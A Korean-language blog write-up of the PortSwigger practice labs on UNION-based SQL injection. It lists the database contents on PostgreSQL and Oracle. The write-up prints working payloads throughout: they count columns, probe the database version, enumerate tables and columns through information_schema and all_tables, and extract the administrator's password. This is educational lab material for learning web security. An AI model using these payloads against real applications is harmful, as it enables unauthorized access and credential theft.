+++
date = '2026-05-20T14:12:44+09:00'
draft = false
title = '[Write-up] PortSwigger - SQL injection attack, listing the database contents'
summary = "메타데이터 뷰(information_schema, all_tables)를 조회해 사용자 계정 테이블과 컬럼을 열거하고, administrator의 비밀번호를 탈취해 로그인하는 PortSwigger 랩 풀이 (non-Oracle · Oracle)"
toc = true
tags = ["SQL Injection", "UNION-Based", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab (non-Oracle)**: [listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)  
> **Lab (Oracle)**: [listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

> ![image.png](/writeup/portswigger/sqli/04/1.png)

Product Filter 기능에 UNION 기반 SQL Injection이 존재한다.  
사용자 계정을 저장하는 테이블의 이름과 컬럼을 모두 알아낸 뒤, administrator 계정의 정보를 탈취해 로그인하면 문제가 해결된다.

### SQL Injection 진단

먼저 Product Filter에 다음 페이로드를 삽입해 컬럼 개수를 파악한다.

```sql
' UNION SELECT NULL,NULL--
```

컬럼 개수는 2개이며, 두 컬럼 모두 응답 본문에 표시되는 것을 확인했다.

### DBMS 식별과 테이블·컬럼 조회

정확한 DBMS를 식별하기 위해 DB별 버전 조회 함수를 각각 삽입한다.

```sql
' UNION SELECT NULL,@@version--
```

```sql
' UNION SELECT NULL,version()--
```

두 번째 페이로드에서 `PostgreSQL 12.22 ...` 형태의 응답이 반환되어, 대상 DBMS가 PostgreSQL임을 확인할 수 있다.  
DBMS를 식별했으니 메타데이터 뷰인 `information_schema.tables` 를 조회해 테이블 목록을 획득한다.

```sql
' UNION SELECT table_schema,table_name FROM information_schema.tables--
```

조회된 테이블 중 사용자 계정으로 추정되는 `users_cdfncj` 가 존재한다. 이어서 해당 테이블의 컬럼을 조회한다.

```sql
' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_name = 'users_cdfncj'--
```

응답에서 다음 컬럼을 확인할 수 있다.

```
password_iljtvg
email
username_qhfdbc
```

테이블·컬럼명의 무작위 접미사(`_cdfncj`, `_iljtvg` 등)는 랩 인스턴스마다 다르게 부여된다.

### Oracle에서의 조회

Oracle은 `information_schema` 를 제공하지 않으므로, 데이터 딕셔너리 뷰인 `all_tables` 와 `all_tab_columns` 를 사용한다.

```sql
' UNION SELECT OWNER,TABLE_NAME FROM all_tables--
```

응답에서 `USERS_LCUIKX` 테이블을 확인할 수 있으며, 해당 테이블의 컬럼을 조회한다.

```sql
' UNION SELECT TABLE_NAME,COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_LCUIKX'--
```

조회 결과는 다음과 같다.

```
EMAIL
PASSWORD_OVTGZH
USERNAME_ZFSBJV
```

---

## 익스플로잇

테이블명과 컬럼명을 모두 확보했으니, administrator 계정의 아이디와 비밀번호를 조회하는 페이로드를 구성한다.

PostgreSQL

```sql
' UNION SELECT username_qhfdbc,password_iljtvg FROM users_cdfncj WHERE username_qhfdbc='administrator'--
```

Oracle

```sql
' UNION SELECT USERNAME_ZFSBJV,PASSWORD_OVTGZH FROM USERS_LCUIKX WHERE USERNAME_ZFSBJV='administrator'--
```

조회 결과로 administrator 계정의 비밀번호를 획득할 수 있으며, 이를 이용해 로그인하면 문제가 해결된다.

![image.png](/writeup/portswigger/sqli/04/2.png)

---

## 정리

`information_schema` 는 MySQL·PostgreSQL·Microsoft SQL Server 등 대부분의 DBMS가 제공하는 메타데이터 뷰로, 테이블과 컬럼 구조를 열거하는 데 사용된다.  
반면 Oracle은 `information_schema` 를 제공하지 않으므로 `all_tables`, `all_tab_columns` 같은 데이터 딕셔너리 뷰로 동일한 정보를 조회한다. 테이블·컬럼명이 무작위 접미사로 난독화되어 있어도, 이러한 메타데이터 조회로 구조를 먼저 파악하면 계정 정보까지 추출할 수 있다.
